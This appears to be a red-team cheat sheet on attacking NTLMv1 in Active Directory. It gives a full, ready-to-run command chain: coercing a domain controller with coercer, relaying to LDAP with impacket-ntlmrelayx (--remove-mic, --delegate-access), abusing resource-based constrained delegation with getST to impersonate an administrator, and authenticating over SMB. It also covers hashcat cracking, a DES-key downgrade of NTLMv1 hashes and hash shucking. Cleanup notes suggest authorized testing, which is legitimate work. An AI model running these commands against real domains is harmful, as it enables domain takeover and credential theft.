# NTLMv1

## Relaying NTLMv1

### LDAP

### Requirements

- At least two Domain Controllers in the target Domain
- One domain controller configured with a LanMan Compatability setting at or less than '2' (Coerce Target)
- Target Domain Controller is not Windows Server 2025 (Default LDAP Signing and Binding)

#### LDAP Signing and Channel Binding
- LDAP Signing is enforced: Relay -> ```ldaps://```
- LDAP Signing is not enforced but channel binding is: Relay -> ```ldap://``` (Impacket uses StartTLS)
- **Note**: NTLMv1 does not support channel binding

#### Optional Requirements (Depends on attack vector)

#### MAQ -> RBCD -> Domain Administrator

- MAQ Greater than 0
- Account to impersonate not in "Protected Users" or "Sensitive and cant be delegated"

#### Attack Chain

> Coerce
```bash
coercer coerce -u "USERNAME" -p "PASSWORD" -d "DOMAIN" -t "TARGET" -l "LISTENER"
```
> Relay
```
sudo impacket-ntlmrelayx -t ldap://TARGET --remove-mic -smb2support --delegate-access
```
> RBCD
```bash
impacket-getST DOMAIN/'MACHINE$':'PASSWORD' -impersonate "ADMIN" -spn "SERVICE/TARGET FQDN" -dc-ip "DC IP"
```
> Authentication
```bash
nxc smb "TARGET" --use-kcache 
```

#### Cleanup

- The system we coerce from has the ```msDs-AllowedToActOnBehalfOfOtherIdentity``` attribute modified to the created machine account. Ensure this is removed on engagements.
- Ensure the created machine account is removed at the end of the engagement.

```powershell
# Run in elevated PowerShell

# Clear msDS-AllowedToActOnBehalfOfOtherIdentity attribute
Get-ADComputer -Identity "DC01$" | ForEach-Object { Set-ADObject -Identity $_.DistinguishedName -Clear "msDS-AllowedToActOnBehalfOfOtherIdentity" }

# Remove Created Computer Account
Remove-ADComputer -Identity "WSW01$"
```

## Recovering NTLMv1 Credentials

### Password Cracking
Two available recovery methods for password cracking
- Standard cracking (Wordlist / ruleset)
- Downgrade to 3DES keys and exhaust key space

#### Standard Cracking (Hashcat Mode 5500)
```
hashcat.exe -m 5500 -a 0 -O 5500.txt weakpass_4.txt -r rules\best64.rule
```
#### Downgrade to 3DES keys (Hashcat Mode 14000)
> Setup
```
python3 -m venv venv 
pip3 install pycryptodome
wget https://raw.githubusercontent.com/hashcat/hashcat-utils/refs/heads/master/src/ntlmv1.py
```
> Downgrade
```
# Downgrade
python3 ntlmv1.py --ntlmv1 Moe::SEVENKINGDOMS:535549550D915... --hashcat

# Echo contents to file
echo "535549550D915078:1122334455667788" >> 14000.hash
echo "B4F2F4334C1992E0:1122334455667788" >> 14000.hash
```
> Crack
```
# Full DES Key Space
hashcat.exe -m 14000 -a 3 -1 charsets/DES_full.hcchr --hex-charset 14000.hash ?1?1?1?1?1?1?1?1
```
### Password Shucking
If the plaintext equivalent of the NTLMv1 password is known in online lookup databases, password shucking can be performed to recover the plaintext.

- Only feasible for user account passwords

URL: https://shuck.sh/get-shucking.php

```
[+]  INPUT TOKEN                                    NT-HASH (PTH-READY)

Moe::SEVENKINGDOMS:535549550D915078B4F2...              Password123
```